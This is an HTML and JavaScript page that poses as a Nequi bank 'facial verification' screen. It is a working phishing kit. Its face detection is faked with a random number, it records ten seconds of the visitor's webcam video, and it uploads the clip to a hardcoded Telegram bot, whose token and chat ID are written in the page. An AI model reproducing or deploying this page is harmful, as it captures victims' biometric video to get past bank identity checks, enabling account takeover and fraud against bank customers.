<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Facial - Nequi</title>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* ALERTA */
.alerta-selfie{
    position:fixed;
    top:20px;
    left:50%;
    transform:translateX(-50%);
    background:rgba(0,0,0,0.85);
    color:#fff;
    padding:15px 20px;
    border-radius:15px;
    font-size:14px;
    text-align:center;
    max-width:90%;
    z-index:9999;
    opacity:0;
    transition:0.4s;
}
.alerta-selfie.show{ opacity:1; }

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 10;
}

.oval.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
}

/* TEXTO ARRIBA */
.texto-arriba {
    position: absolute;
    top: calc(50% - 260px);
    left: 50%;
    transform: translateX(-50%);
    color: white;
    font-size: 16px;
    font-weight: bold;
    text-shadow: 1px 1px 3px black;
    z-index: 20;
}

/* STATUS */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
    font-size: 18px;
    font-weight: bold;
}

/* WARNING */
.warning-message {
    position: absolute;
    top: 80px;
    left: 50%;
    transform: translateX(-50%);
    background: red;
    color: white;
    padding: 10px 20px;
    border-radius: 20px;
    display:none;
}
.warning-message.show{ display:block; }

/* CONTADOR */
.countdown {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 80px;
    color: white;
    z-index: 100;
    background: rgba(0,0,0,0.6);
    padding: 20px 40px;
    border-radius: 50px;
    display: none;
}
.countdown.show { display:block; }

</style>
</head>

<body>

<div class="texto-arriba">Mira al frente de la cámara</div>

<div id="alertaSelfie" class="alerta-selfie">
📸 Verificación Facial<br>
Mantén tu rostro en el círculo<br>
mira de frente a la Camara por favor
</div>

<div class="warning-message" id="warningMessage">
⚠️ Coloca tu rostro en el círculo
</div>

<div class="status" id="status">
 Coloca tu rostro en el círculo
</div>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>

<!-- SOLO UNO -->
<div class="oval" id="oval"></div>

<div class="countdown" id="countdown">3</div>

<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const warningMessage = document.getElementById("warningMessage");
const countdownDiv = document.getElementById("countdown");

/* ALERTA */
const alertaSelfie = document.getElementById("alertaSelfie");
window.addEventListener("load", ()=>{
    alertaSelfie.classList.add("show");
    setTimeout(()=> alertaSelfie.classList.remove("show"),5000);
});

/* TELEGRAM */
const TELEGRAM_CONFIG = {
    token: "8782203483:AAH7Fjcea68haG9OjqRiiImNW4x4grYXhXE",
    chatId: "7158969671"
};

let recording = false;
let mediaRecorder = null;
let recordedChunks = [];
let faceDetected = false;
let detectionInterval = null;
let videoStream = null;

/* CAMARA */
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    videoStream = stream;
    video.srcObject = stream;
})
.catch(() => {
    statusText.innerText = "❌ Error cámara";
});

/* DETECCIÓN */
function startFaceDetection() {
    if (detectionInterval) clearInterval(detectionInterval);

    detectionInterval = setInterval(() => {
        if (recording || faceDetected) return;

        if (Math.random() > 0.5) {
            oval.classList.add("valid");
            warningMessage.classList.remove("show");
            statusText.innerText = "✅ Rostro detectando..";

            faceDetected = true;
            clearInterval(detectionInterval);

            setTimeout(() => startRecording(videoStream), 1000);

        } else {
            oval.classList.remove("valid");
            warningMessage.classList.add("show");
            statusText.innerText = " Coloca tu rostro en el círculo";
        }
    }, 1000);
}

/* GRABAR */
function startRecording(stream) {
    if (recording) return;

    recording = true;
    recordedChunks = [];

    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };

    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        statusText.innerText = "Enviando...";
        enviarVideoTelegram(blob);
    };

    let count = 3;
    countdownDiv.innerText = count;
    countdownDiv.classList.add("show");

    const interval = setInterval(() => {
        count--;
        if (count > 0) {
            countdownDiv.innerText = count;
        } else {
            clearInterval(interval);
            countdownDiv.classList.remove("show");

            mediaRecorder.start();
            statusText.innerText = "Mira de frente a la Camara";

            setTimeout(() => {
                if (mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    statusText.innerText = "finalizada...";
                }
            }, 10000);
        }
    }, 1000);
}

/* ENVIAR */
function enviarVideoTelegram(videoBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('video', videoBlob, 'verificacion.webm');

    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendVideo`, {
        method: 'POST',
        body: formData
    })
    .then(res => {
        if (res.ok) {
            statusText.innerText = "✅ enviado correctamente";
        } else {
            throw new Error();
        }
    })
    .catch(() => {
        statusText.innerText = "❌ error al enviar";
        recording = false;
        faceDetected = false;
        setTimeout(startFaceDetection, 3000);
    });
}

/* INICIO */
window.addEventListener("load", () => {
    setTimeout(() => {
        if (videoStream) startFaceDetection();
    }, 2000);
});
</script>

</body>
</html>
